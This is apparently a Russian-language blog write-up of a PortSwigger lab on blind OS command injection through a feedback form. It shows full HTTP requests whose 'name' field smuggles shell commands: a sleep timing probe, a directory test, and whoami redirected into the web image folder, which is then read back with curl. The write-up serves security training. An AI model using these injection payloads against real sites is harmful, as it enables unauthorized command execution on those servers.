---
title: "Blind OS command injection with output redirection"
date: 2025-06-27
tags: [injection, writeup, web]  
categories: [PortSwigger]
tagline: ""
header:
  overlay_image: /assets/images/ps_logo.webp
  overlay_filter: 0.5 
  overlay_color: "#fff"
  actions:
    - label: "Lab PortSwigger"
      url: "https://portswigger.net/web-security/os-command-injection/lab-blind-output-redirection"
classes: wide
---

Содержит уязвимость **Blind OS command injection**. Для прохождения нужно запустить `whoami` и получить ответ.

```
https://0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net/
```

## Solution

Бегом ковырять форму обратной связи) Соберу `HTTP` запрос:

```http
POST /feedback/submit HTTP/2
Host: 0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net
Cookie: session=j59254npT3m9vkCo4vKcazNtjtjv6vqc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 103
Origin: https://0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=HvTHIyttOlZUyY0u3zSf9UZGnAiwDFtM&name=name&email=email%40mail.com&subject=subeject&message=message
```

Проверю поля:

```http
POST /feedback/submit HTTP/2
Host: 0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net
Cookie: session=j59254npT3m9vkCo4vKcazNtjtjv6vqc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 110
Origin: https://0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=HvTHIyttOlZUyY0u3zSf9UZGnAiwDFtM&name=$(sleep 10)&email=email%40mail.com&subject=subeject&message=message
```

Поле `name` уязвимо, значит можно использовать его для запуска шелла. Нужно как-то вывести информацию на сайт. На сайте есть картинки. Если для хостинга используется `appache`, то можно попробовать создать файл в `/var/www/images`. Проверю, что эта директория есть:

```bash
if test -d "/var/www/images"; then sleep 10; fi
```

В данной строке я проверяю, что `/var/www/images` — это директория. Если это так, то вызываю `sleep 10`:

```http
POST /feedback/submit HTTP/2
Host: 0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net
Cookie: session=j59254npT3m9vkCo4vKcazNtjtjv6vqc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 149
Origin: https://0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=HvTHIyttOlZUyY0u3zSf9UZGnAiwDFtM&name=$(if test -d "/var/www/images"; then sleep 10; fi)&email=email%40mail.com&subject=subeject&message=message
```

Я получил нужную задержку:

![IMG](/assets/images/IMG_os_command_injection/IMG_Blind_OS_command_injection_with_output_redirection/1.png){: height="200" .align-center}

Попробую создать файл:

```http
POST /feedback/submit HTTP/2
Host: 0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net
Cookie: session=j59254npT3m9vkCo4vKcazNtjtjv6vqc
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Referer: https://0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net/feedback
Content-Type: application/x-www-form-urlencoded
Content-Length: 140
Origin: https://0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Priority: u=0
Te: trailers

csrf=HvTHIyttOlZUyY0u3zSf9UZGnAiwDFtM&name=$(whoami > "/var/www/images/my_file.jpg")&email=email%40mail.com&subject=subeject&message=message
```

Прочитаю файл через `curl`:

```bash
cu63:~/ $ curl https://0a3300bb04b6dd9981967abf00ec00ac.web-security-academy.net/image\?filename\=my_file.jpg                      
peter-nYlJLk
```

Лаба решена:

![IMG](/assets/images/IMG_os_command_injection/IMG_Blind_OS_command_injection_with_output_redirection/2.png){: height="200" .align-center}
